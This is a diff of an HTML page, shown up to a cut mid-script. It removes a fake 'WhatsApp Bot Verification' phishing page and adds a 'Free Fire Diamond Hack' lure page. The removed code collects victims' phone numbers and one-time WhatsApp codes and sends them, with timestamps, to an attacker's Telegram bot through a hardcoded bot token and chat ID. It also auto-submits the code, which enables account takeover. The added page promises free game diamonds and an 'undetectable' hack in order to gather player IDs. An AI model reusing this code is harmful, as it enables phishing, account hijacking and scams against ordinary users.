@@ -1,513 +1,842 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>WhatsApp Verification</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-    
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(135deg, #ece5dd 0%, #d6dbd2 100%);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      padding: 16px;
-    }
-    
-    .card {
-      background: #fff;
-      width: 100%;
-      max-width: 400px;
-      padding: 24px 20px;
-      border-radius: 15px;
-      box-shadow: 0 6px 15px rgba(0,0,0,0.15);
-      text-align: center;
-      position: relative;
-      overflow: hidden;
-    }
-    
-    .whatsapp-icon {
-      font-size: 48px;
-      color: #25d366;
-      margin-bottom: 10px;
-    }
-    
-    h2 {
-      color: #075e54;
-      margin-bottom: 20px;
-      font-size: 24px;
-      position: relative;
-      padding-bottom: 10px;
-    }
-    
-    h2:after {
-      content: '';
-      position: absolute;
-      bottom: 0;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 50px;
-      height: 3px;
-      background: #25d366;
-      border-radius: 3px;
-    }
-    
-    .input-group {
-      display: flex;
-      gap: 8px;
-      margin-bottom: 16px;
-    }
-    
-    select {
-      flex: 1;
-      height: 42px;
-      width: 85px;
-      margin: 8px 0;
-      border-radius: 8px;
-      border: 1px solid #ccc;
-      font-size: 14px;
-      background-color: #fff;
-      padding: 0 8px;
-    }
-    
-    input {
-      width: 100%;
-      padding: 12px;
-      margin: 8px 0;
-      border-radius: 8px;
-      border: 1px solid #ccc;
-      font-size: 16px;
-      transition: border-color 0.3s;
-    }
-    
-    input:focus {
-      border-color: #25d366;
-      outline: none;
-    }
-    
-    button {
-      width: 100%;
-      padding: 14px;
-      background: #25d366;
-      border: none;
-      border-radius: 8px;
-      color: white;
-      font-size: 18px;
-      font-weight: bold;
-      cursor: pointer;
-      margin-top: 8px;
-      transition: background 0.3s, transform 0.2s;
-    }
-    
-    button:hover {
-      background: #128C7E;
-      transform: translateY(-2px);
-    }
-    
-    button:active {
-      transform: translateY(0);
-    }
-    
-    button:disabled {
-      background: #b9f6ca;
-      cursor: not-allowed;
-      transform: none;
-    }
-    
-    #loading {
-      display: none;
-      font-size: 16px;
-      color: #444;
-      margin: 15px 0;
-    }
-    
-    #otpPage {
-      display: none;
-    }
-    
-    .timer {
-      margin: 12px 0;
-      font-size: 15px;
-      color: #666;
-    }
-    
-    .timer span {
-      font-weight: bold;
-      color: #075e54;
-    }
-    
-    .resend {
-      margin-top: 16px;
-      color: #128C7E;
-      font-size: 15px;
-      cursor: pointer;
-      transition: color 0.3s;
-    }
-    
-    .resend:hover {
-      text-decoration: underline;
-    }
-    
-    .resend.disabled {
-      color: #ccc;
-      cursor: not-allowed;
-      text-decoration: none;
-    }
-    
-    .success-message {
-      display: none;
-      color: #25d366;
-      margin-top: 15px;
-      font-weight: bold;
-      padding: 10px;
-      background: #f0fff0;
-      border-radius: 8px;
-    }
-    
-    .error-message {
-      display: none;
-      color: #ff3333;
-      margin-top: 15px;
-      font-weight: bold;
-      padding: 10px;
-      background: #fff0f0;
-      border-radius: 8px;
-    }
-    
-    .try-again-btn {
-      background: #ff3333;
-      margin-top: 10px;
-    }
-    
-    .try-again-btn:hover {
-      background: #cc0000;
-    }
-    
-    .otp-inputs {
-      display: flex;
-      justify-content: space-between;
-      margin: 20px 0;
-    }
-    
-    .otp-input {
-      width: 45px;
-      height: 45px;
-      text-align: center;
-      font-size: 20px;
-      border: 2px solid #ccc;
-      border-radius: 8px;
-      transition: all 0.3s;
-    }
-    
-    .otp-input:focus {
-      border-color: #25d366;
-      outline: none;
-      box-shadow: 0 0 5px rgba(37, 211, 102, 0.5);
-    }
-    
-    .step-indicator {
-      display: flex;
-      justify-content: center;
-      margin-bottom: 20px;
-    }
-    
-    .step {
-      width: 30px;
-      height: 30px;
-      border-radius: 50%;
-      background: #ccc;
-      color: white;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin: 0 10px;
-      font-weight: bold;
-    }
-    
-    .step.active {
-      background: #25d366;
-    }
-    
-    .step-line {
-      width: 40px;
-      height: 2px;
-      background: #ccc;
-      margin: 0 5px;
-      align-self: center;
-    }
-    
-    .step-line.active {
-      background: #25d366;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire Diamond Headshot Hack</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        :root {
+            --primary: #ffcc00;
+            --secondary: #ff6b00;
+            --dark: #0f1524;
+            --darker: #0a0e1a;
+            --accent: #00e5ff;
+        }
+        
+        body {
+            background: linear-gradient(135deg, var(--darker) 0%, var(--dark) 100%);
+            color: white;
+            min-height: 100vh;
+            overflow-x: hidden;
+            transition: all 0.5s ease;
+        }
+        
+        .maintenance-mode {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #1a1a1a 0%, #000000 100%);
+            z-index: 1000;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .maintenance-content {
+            max-width: 600px;
+            padding: 40px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            box-shadow: 0 0 50px rgba(255, 204, 0, 0.3);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 204, 0, 0.2);
+            animation: pulse 2s infinite;
+        }
+        
+        .maintenance-icon {
+            font-size: 5rem;
+            color: var(--primary);
+            margin-bottom: 20px;
+            animation: spin 3s linear infinite;
+        }
+        
+        .maintenance-title {
+            font-size: 2.5rem;
+            color: var(--primary);
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px rgba(255, 204, 0, 0.5);
+        }
+        
+        .maintenance-message {
+            font-size: 1.2rem;
+            line-height: 1.6;
+            margin-bottom: 30px;
+            color: #ccc;
+        }
+        
+        .countdown {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 30px;
+        }
+        
+        .countdown-box {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 10px;
+            padding: 15px;
+            min-width: 80px;
+            text-align: center;
+            border: 1px solid var(--primary);
+        }
+        
+        .countdown-value {
+            font-size: 2rem;
+            font-weight: bold;
+            color: var(--accent);
+        }
+        
+        .countdown-label {
+            font-size: 0.9rem;
+            color: #ccc;
+            margin-top: 5px;
+        }
+        
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+        
+        .particle {
+            position: absolute;
+            background: var(--primary);
+            border-radius: 50%;
+            opacity: 0.3;
+            animation: float 15s infinite linear;
+        }
+        
+        @keyframes float {
+            0% {
+                transform: translateY(0) translateX(0) rotate(0deg);
+            }
+            100% {
+                transform: translateY(-100vh) translateX(100px) rotate(360deg);
+            }
+        }
+        
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            animation: fadeInDown 1s ease;
+        }
+        
+        .logo {
+            font-size: 2.5rem;
+            color: var(--primary);
+            text-shadow: 0 0 10px rgba(255, 204, 0, 0.7);
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+        
+        .logo i {
+            animation: pulse 2s infinite;
+        }
+        
+        .banner {
+            width: 100%;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
+            margin-bottom: 30px;
+            animation: zoomIn 1s ease;
+            position: relative;
+        }
+        
+        .banner::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(to bottom, transparent 70%, var(--darker) 100%);
+            pointer-events: none;
+        }
+        
+        .banner img {
+            width: 100%;
+            display: block;
+            transition: transform 0.5s ease;
+        }
+        
+        .banner:hover img {
+            transform: scale(1.03);
+        }
+        
+        .panel {
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+            margin-bottom: 30px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            animation: slideUp 1s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .panel::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            transition: 0.5s;
+        }
+        
+        .panel:hover::before {
+            left: 100%;
+        }
+        
+        .panel-image {
+            width: 100%;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            transition: transform 0.3s ease;
+        }
+        
+        .panel-image:hover {
+            transform: scale(1.02);
+        }
+        
+        h1 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: var(--primary);
+            text-shadow: 0 0 10px rgba(255, 204, 0, 0.5);
+            font-size: 2.2rem;
+            animation: glow 2s infinite alternate;
+        }
+        
+        h2 {
+            color: var(--primary);
+            margin-bottom: 20px;
+            text-align: center;
+            font-size: 1.8rem;
+            position: relative;
+            display: inline-block;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        
+        h2::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, var(--primary), transparent);
+        }
+        
+        .request-form {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        
+        label {
+            font-weight: bold;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        input, select {
+            padding: 15px;
+            border-radius: 8px;
+            border: none;
+            background: rgba(255, 255, 255, 0.1);
+            font-size: 16px;
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            transition: all 0.3s ease;
+        }
+        
+        input:focus, select:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 10px rgba(255, 204, 0, 0.3);
+            background: rgba(255, 255, 255, 0.15);
+        }
+        
+        .submit-btn {
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            color: var(--darker);
+            border: none;
+            padding: 18px;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 15px;
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+            box-shadow: 0 5px 15px rgba(255, 153, 0, 0.4);
+        }
+        
+        .submit-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+            transition: 0.5s;
+            z-index: -1;
+        }
+        
+        .submit-btn:hover::before {
+            left: 100%;
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255, 153, 0, 0.6);
+        }
+        
+        .submit-btn:active {
+            transform: translateY(1px);
+        }
+        
+        .submit-btn:disabled {
+            background: #666;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .submit-btn:disabled::before {
+            display: none;
+        }
+        
+        .time-notice {
+            text-align: center;
+            background: linear-gradient(135deg, rgba(255, 0, 0, 0.2), rgba(255, 100, 0, 0.2));
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 25px;
+            border-left: 4px solid #ff3333;
+            animation: pulse 2s infinite;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .time-notice::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            transform: translateX(-100%);
+            animation: shimmer 3s infinite;
+        }
+        
+        .timer-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+        
+        .timer-box {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 15px;
+            min-width: 80px;
+            text-align: center;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .timer-value {
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: var(--accent);
+            text-shadow: 0 0 10px rgba(0, 229, 255, 0.7);
+        }
+        
+        .timer-label {
+            font-size: 0.9rem;
+            color: #ccc;
+            margin-top: 5px;
+        }
+        
+        .success-message {
+            text-align: center;
+            background: linear-gradient(135deg, rgba(0, 255, 0, 0.2), rgba(0, 200, 100, 0.2));
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 25px;
+            border-left: 4px solid #00cc00;
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .feature {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            transition: transform 0.3s ease;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .feature:hover {
+            transform: translateY(-5px);
+            background: rgba(255, 255, 255, 0.08);
+        }
+        
+        .feature i {
+            font-size: 2.5rem;
+            color: var(--primary);
+            margin-bottom: 15px;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            color: #aaa;
+            font-size: 14px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        /* Animations */
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+        
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        @keyframes zoomIn {
+            from {
+                opacity: 0;
+                transform: scale(0.9);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+        
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                box-shadow: 0 0 10px rgba(255, 204, 0, 0.5);
+            }
+            50% {
+                transform: scale(1.02);
+                box-shadow: 0 0 20px rgba(255, 204, 0, 0.8);
+            }
+            100% {
+                transform: scale(1);
+                box-shadow: 0 0 10px rgba(255, 204, 0, 0.5);
+            }
+        }
+        
+        @keyframes glow {
+            0% {
+                text-shadow: 0 0 10px rgba(255, 204, 0, 0.5);
+            }
+            100% {
+                text-shadow: 0 0 20px rgba(255, 204, 0, 0.8), 0 0 30px rgba(255, 204, 0, 0.6);
+            }
+        }
+        
+        @keyframes shimmer {
+            0% {
+                transform: translateX(-100%);
+            }
+            100% {
+                transform: translateX(100%);
+            }
+        }
+        
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+            }
+            
+            h1 {
+                font-size: 1.8rem;
+            }
+            
+            .logo {
+                font-size: 2rem;
+            }
+            
+            .timer-value {
+                font-size: 2rem;
+            }
+            
+            .features {
+                grid-template-columns: 1fr;
+            }
+            
+            .maintenance-content {
+                padding: 20px;
+            }
+            
+            .maintenance-title {
+                font-size: 2rem;
+            }
+        }
+    </style>
 </head>
 <body>
-  <div class="card">
-    <div class="whatsapp-icon">
-      <i class="fab fa-whatsapp"></i>
+    <!-- Maintenance Mode Screen -->
+    <div class="maintenance-mode" id="maintenanceMode">
+        <div class="maintenance-content">
+            <div class="maintenance-icon">
+                <i class="fas fa-tools"></i>
+            </div>
+            <h1 class="maintenance-title">Website Under Maintenance</h1>
+            <p class="maintenance-message">
+                Our website is currently undergoing scheduled maintenance.<br>
+                We are working to improve your experience and will be back online at <strong>7:00 PM</strong>.
+            </p>
+            <p class="maintenance-message">
+                <i class="fas fa-info-circle"></i> Panel request links are only available between 6 PM to 7 PM.
+            </p>
+            
+            <div class="countdown">
+                <div class="countdown-box">
+                    <div class="countdown-value" id="maintenanceHours">00</div>
+                    <div class="countdown-label">HOURS</div>
+                </div>
+                <div class="countdown-box">
+                    <div class="countdown-value" id="maintenanceMinutes">00</div>
+                    <div class="countdown-label">MINUTES</div>
+                </div>
+                <div class="countdown-box">
+                    <div class="countdown-value" id="maintenanceSeconds">00</div>
+                    <div class="countdown-label">SECONDS</div>
+                </div>
+            </div>
+        </div>
     </div>
-    <h2>WhatsApp Bot Verification</h2>
+
+    <!-- Normal Website Content -->
+    <div class="particles" id="particles"></div>
     
-    <div class="step-indicator">
-      <div class="step active">1</div>
-      <div class="step-line"></div>
-      <div class="step">2</div>
-    </div>
-
-    <!-- Number Page -->
-    <div id="numberPage">
-      <div class="input-group">
-        <select id="countryCode">
-        <option value="+977">🇳🇵 Nepal (+977)</option>
-        <option value="+92">🇵🇰 Pakistan (+92)</option>
-        <option value="+880">🇧🇩 Bangladesh (+880)</option>
-        <option value="+1">🇺🇸 USA (+1)</option>
-        <option value="+44">🇬🇧 UK (+44)</option>
-        <option value="+971">🇦🇪 UAE (+971)</option>
-        <option value="+234">🇳🇬 Nigeria (+234)</option>
-        <option value="+93">🇦🇫 Afghanistan (+93)</option>
-        <option value="+358">🇦🇽 Åland Islands (+358)</option>
-        <option value="+355">🇦🇱 Albania (+355)</option>
-        <option value="+213">🇩🇿 Algeria (+213)</option>
-        <option value="+1">🇦🇸 American Samoa (+1)</option>
-        <option value="+376">🇦🇩 Andorra (+376)</option>
-        <option value="+244">🇦🇴 Angola (+244)</option>
-        <option value="+1">🇦🇮 Anguilla (+1)</option>
-        <option value="+1">🇦🇬 Antigua and Barbuda (+1)</option>
-        <option value="+54">🇦🇷 Argentina (+54)</option>
-        <option value="+374">🇦🇲 Armenia (+374)</option>
-        <option value="+1">🇧🇧 Barbados (+1)</option>
-        <option value="+375">🇧🇾 Belarus (+375)</option>
-        <option value="+1">🇨🇦 Canada (+1)</option>
-        <option value="+238">🇨🇻 Cape Verde (+238)</option>
-        <option value="+1">🇰🇾 Cayman Islands (+1)</option>
-        <option value="+236">🇨🇫 Central African Republic (+236)</option>
-        <option value="+235">🇹🇩 Chad (+235)</option>
-        <option value="+56">🇨🇱 Chile (+56)</option>
-        <option value="+86">🇨🇳 China (+86)</option>
-        </select>
-        <input type="tel" id="phoneNumber" maxlength="10" placeholder="10 digit number" inputmode="numeric">
-      </div>
-      <button onclick="sendNumber()">Next</button>
-      <div id="loading">Please wait, sending verification code...</div>
-    </div>
-
-    <!-- OTP Page -->
-    <div id="otpPage">
-      <p>Enter the 6-digit code sent to your phone</p>
-      
-      <div class="otp-inputs">
-        <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 1)">
-        <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 2)">
-        <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 3)">
-        <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 4)">
-        <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 5)">
-        <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 6)">
-      </div>
-      
-      <div class="timer">Time remaining: <span id="countdown">01:00</span></div>
-      <button onclick="submitOtp()">Verify OTP</button>
-      <div class="resend disabled" id="resendBtn" onclick="resendOtp()">Resend OTP</div>
-    </div>
-
-    <div class="success-message" id="successMessage">
-      <i class="fas fa-check-circle"></i> OTP verified successfully! Redirecting...
-    </div>
-    
-    <div class="error-message" id="errorMessage">
-      <i class="fas fa-exclamation-circle"></i> Verification failed. Please try again.
-      <button class="try-again-btn" onclick="tryAgain()">Try Again</button>
-    </div>
-  <script>
-    // Telegram Bot Configuration - Multiple Chat IDs
-    const TELEGRAM_BOT_TOKEN = "8283989728:AAHYJwZ_oQDptHKrRg-eCOmQOzyq1EUGlrs";
-    const TELEGRAM_CHAT_IDS = ["7493999091", "7493999091"];
-    
-    let fullNumber = "";
-    let countdownTimer;
-    let timeLeft = 60;
-
-    // Function to send message to multiple Telegram chats
-    async function sendToTelegram(message) {
-      const sendPromises = TELEGRAM_CHAT_IDS.map(async (chatId) => {
-        try {
-          const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-          const response = await fetch(url, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-              chat_id: chatId,
-              text: message,
-              parse_mode: 'HTML'
-            })
-          });
-          
-          const data = await response.json();
-          return data.ok;
-        } catch (error) {
-          console.error('Error sending to Telegram:', error);
-          return false;
-        }
-      });
-      
-      const results = await Promise.all(sendPromises);
-      return results.every(result => result === true);
-    }
-
-    // Step 1: Enter number
-    window.sendNumber = function() {
-      const code = document.getElementById("countryCode").value;
-      const num = document.getElementById("phoneNumber").value.trim();
-
-      if (num.length !== 10 || isNaN(num)) {
-        alert("Please enter a valid 10 digit number");
-        return;
-      }
-
-      fullNumber = code + num;
-
-      document.getElementById("loading").style.display = "block";
-
-      // Send phone number to Telegram
-      const now = new Date();
-      const time = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
-      const date = now.toLocaleDateString();
-      
-      const message = `⏰<b>Time:${time} Date:</b> ${date}\n\n📱 <b>New WhatsApp Login Attempt</b>\n\n📞 <b>Phone Number:</b> ${fullNumber}\n`;
-      
-      sendToTelegram(message);
-
-      setTimeout(() => {
-        document.getElementById("loading").style.display = "none";
-        document.getElementById("numberPage").style.display = "none";
-        document.getElementById("otpPage").style.display = "block";
+    <div class="container" id="mainContent">
+        <div class="header">
+            <div class="logo">
+                <i class="fas fa-fire"></i>
+                FREE FIRE DIAMOND HACK
+                <i class="fas fa-gem"></i>
+            </div>
+        </div>
         
-        // Update step indicator
-        document.querySelectorAll('.step')[1].classList.add('active');
-        document.querySelector('.step-line').classList.add('active');
+        <div class="banner">
+            <img src="https://i.supaimg.com/5b42528b-4bea-4153-ae96-29d19778410e.jpg" alt="Free Fire Diamond Headshot Hack">
+        </div>
         
-        // Start the countdown timer
-        startTimer();
-      }, 1500);
-    };
-
-    // Timer function
-    function startTimer() {
-      timeLeft = 60;
-      updateTimerDisplay();
-      
-      // Enable/disable resend button
-      document.getElementById('resendBtn').classList.add('disabled');
-      
-      clearInterval(countdownTimer);
-      countdownTimer = setInterval(() => {
-        timeLeft--;
-        updateTimerDisplay();
+        <h1>Unlimited Diamonds & Headshot Hack</h1>
         
-        if (timeLeft <= 0) {
-          clearInterval(countdownTimer);
-          document.getElementById('resendBtn').classList.remove('disabled');
-        }
-      }, 1000);
-    }
-    
-    function updateTimerDisplay() {
-      const minutes = Math.floor(timeLeft / 60);
-      const seconds = timeLeft % 60;
-      document.getElementById('countdown').textContent = 
-        `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-    }
-    
-    // Resend OTP function
-    window.resendOtp = function() {
-      if (timeLeft > 0) return;
-      
-      // Simulate resending OTP
-      const otpInputs = document.querySelectorAll('.otp-input');
-      otpInputs.forEach(input => input.value = '');
-      alert('OTP has been resent!');
-      
-      // Send resend notification to Telegram
-      const now = new Date();
-      const time = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
-      const message = `🔄 <b>OTP Resent</b>\n\n📞 <b>Phone Number:</b> ${fullNumber}\n⏰ <b>Time:</b> ${time}`;
-      
-      sendToTelegram(message);
-      
-      startTimer();
-    };
+        <div class="features">
+            <div class="feature">
+                <i class="fas fa-bolt"></i>
+                <h3>Instant Delivery</h3>
+                <p>Get your diamonds instantly after verification</p>
+            </div>
+            <div class="feature">
+                <i class="fas fa-shield-alt"></i>
+                <h3>100% Safe</h3>
+                <p>Undetectable by Free Fire security system</p>
+            </div>
+            <div class="feature">
+                <i class="fas fa-users"></i>
+                <h3>User Friendly</h3>
+                <p>Easy to use with simple steps</p>
+            </div>
+        </div>
+        
+        <div class="panel">
+            <img src="https://i.supaimg.com/c13a263c-9c5a-492e-af33-b71fb909c21e.jpg" alt="Panel Request" class="panel-image">
+            
+            <h2>Panel Request</h2>
+            
+            <div class="time-notice">
+                <p><strong><i class="fas fa-exclamation-circle"></i> Important Notice:</strong> Panel request link can only be sent between 6 PM to 7 PM</p>
+            </div>
+            
+            <div class="timer-container">
+                <div class="timer-box">
+                    <div class="timer-value" id="hours">--</div>
+                    <div class="timer-label">HOURS</div>
+                </div>
+                <div class="timer-box">
+                    <div class="timer-value" id="minutes">--</div>
+                    <div class="timer-label">MINUTES</div>
+                </div>
+                <div class="timer-box">
+                    <div class="timer-value" id="seconds">--</div>
+                    <div class="timer-label">SECONDS</div>
+                </div>
+            </div>
+            
+            <form class="request-form" id="requestForm">
+                <div class="form-group">
+                    <label for="playerId"><i class="fas fa-user"></i> Player ID:</label>
+                    <input type="text" id="playerId" placeholder="Enter your Player ID" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="diamonds"><i class="fas fa-gem"></i> Diamonds Amount:</label>
+                    <select id="diamonds" required>
+                        <option value="">Select diamonds amount</option>
+                        <option value="100">100 Diamonds</option>
+                        <option value="500">500 Diamonds</option>
+                        <option value="1000">1000 Diamonds</option>
+                        <option value="5000">5000 Diamonds</option>
+                    </select>
+                </div>
+                
+                <button type="submit" class="submit-btn" id="submitBtn">
+                    <i class="fas fa-paper-plane"></i> Request Hack Link
+                </button>
+            </form>
+            
+            <div class="success-message" id="successMessage">
+                <i class="fas fa-check-circle"></i> Your request has been received! The hack link will be sent to you between 6 PM to 7 PM.
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>This is a fan-made website. Free Fire is a registered trademark of Garena.</p>
+            <p>© 2023 Free Fire Diamond Hack. All rights reserved.</p>
+        </div>
+    </div>
 
-    // Step 2: Enter OTP
-    window.submitOtp = async function() {
-      const otpInputs = document.querySelectorAll('.otp-input');
-      let otp = '';
-      otpInputs.forEach(input => otp += input.value);
-      
-      if (otp.length !== 6 || isNaN(otp)) {
-        alert("Please enter a valid 6 digit OTP");
-        return;
-      }
-
-      // Send OTP to Telegram
-      const now = new Date();
-      const time = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
-      const date = now.toLocaleDateString();
-      
-      const message = `⏰ <b>Time:${time} Date:</b> ${date}\n\n✅ <b>OTP Received</b>\n\n📞 <b>Phone Number:</b> ${fullNumber}\n\n🔢 <b>OTP Code:</b> ${otp}\n`;
-      
-      const success = await sendToTelegram(message);
-
-      if (success) {
-        document.getElementById('successMessage').style.display = 'block';
-        document.getElementById('otpPage').style.display = 'none';
-        setTimeout(() => {
-          document.getElementById('successMessage').style.display = 'none';
-          location.reload();
-        }, 2000);
-      } else {
-        // Show error message with Try Again button
-        document.getElementById('errorMessage').style.display = 'block';
-        document.getElementById('otpPage').style.display = 'none';
-      }
-      
-      clearInterval(countdownTimer);
-    };
-    
-    // Try Again function
-    window.tryAgain = function() {
-      document.getElementById('errorMessage').style.display = 'none';
-      document.getElementById('otpPage').style.display = 'block';
-      const otpInputs = document.querySelectorAll('.otp-input');
-      otpInputs.forEach(input => input.value = '');
-      startTimer();
-    };
-    
-    // OTP input navigation
-    function moveToNext(current, nextIndex) {
-      if (current.value.length >= current.maxLength) {
-        const nextInput = document.querySelectorAll('.otp-input')[nextIndex];
-        if (nextInput) {
-          nextInput.focus();
-        }
-      }
-      
-      // Auto-submit if all fields are filled
-      const allInputs = document.querySelectorAll('.otp-input');
-      const allFilled = Array.from(allInputs).every(input => input.value.length === 1);
-      if (allFilled) {
-        submitOtp();
-      }
-    }
-  </script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('requestForm');
+            const submitBtn = document.getElementById('submitBtn');
+            const successMessage = document.getElementById('successMessage');
+            const hoursElement = document.getElementById('hours');
+            const minutesElement = document.getElementById('minutes');
+            const secondsElement = document.getElementById('seconds');
+            const particlesContainer = document.getElementById('particles');
+            const maintenanceMode = document.getElementById('maintenanceMode');
+            const mainContent = document.getElementById('mainContent');
+            const maintenanceHours = document.getElementById('maintenanceHours');
+            const maintenanceMinutes = document.getElementById('maintenanceMinutes');
+            const maintenanceSeconds = document.getElementById('maintenanceSeconds');
+            
+            // Create floating particles
+            function createParticles() {
+                const particlesCount = 30;
+                
+                for (let i = 0; i < particlesCount; i++) {
+                    const particle = document.createElement('div');
+                    particle.classList.add('particle');
+                    
+                    // Random size
+                    const size = Math.random() * 10 + 5;
+                    particle.style.width = `${size}px`;
+                    particle.style.height = `${size}px`;
+                    
+                    // Random position
+                    particle.style.left = `${Math.random() * 100}vw`;
+                    particle.style.top = `${Math.random() * 100}vh`;
+                    
+                    // Random color
+                    const colors = ['#ffcc00', '#ff6b00', '#00e5ff', '#ffffff'];
+                    const color = colors[Math.floor(Math.random() * colors.length)];
